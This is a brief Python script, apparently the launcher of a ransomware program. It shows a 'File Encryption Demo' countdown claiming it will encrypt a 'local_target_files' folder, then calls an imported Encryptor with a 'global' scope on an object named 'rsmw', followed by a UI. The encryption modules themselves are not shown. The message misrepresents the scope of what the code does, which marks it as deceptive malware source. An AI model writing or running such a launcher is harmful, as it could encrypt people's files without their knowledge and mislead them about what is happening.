from encryption import Encryptor
from ui import Ui
import os, time

for timeLeft in range(2):
    os.system('cls')
    print("=== File Encryption Demo ===")
    print(f"Will encrypt \"local_target_files\" folder in {2-timeLeft}sec")
    time.sleep(1)

encryptionScope = "global"

rsmw = Encryptor(encryptionScope)
rsmw.FileEncryption()
ui = Ui(encryptionScope)